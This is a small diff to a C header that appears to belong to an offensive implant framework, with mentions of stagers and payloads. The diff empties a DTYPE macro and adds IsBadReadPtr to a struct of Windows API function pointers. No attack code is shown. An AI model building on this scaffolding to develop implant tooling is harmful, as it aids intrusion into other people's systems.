@@ -45,7 +45,7 @@ typedef uint64_t uint64;
 #define P_TYPE(T, x)                    ((T*) x)
 
 
-#define DTYPE(x)						decltype(x) *x
+#define DTYPE(x)						
 #define FUNCTION						TEXT_SECTION(B)
 #define CONFIG                          TEXT_SECTION(F)
 #define SECTION(x)                      __attribute__((used, section(x)))
@@ -597,6 +597,7 @@ struct _hexane {
 	// TODO: set standard apis for stagers and payloads
 
     struct {
+		DTYPE(IsBadReadPtr);
 		DTYPE(DeviceIoControl);
         DTYPE(FileTimeToSystemTime);
         DTYPE(GetCurrentDirectoryA);
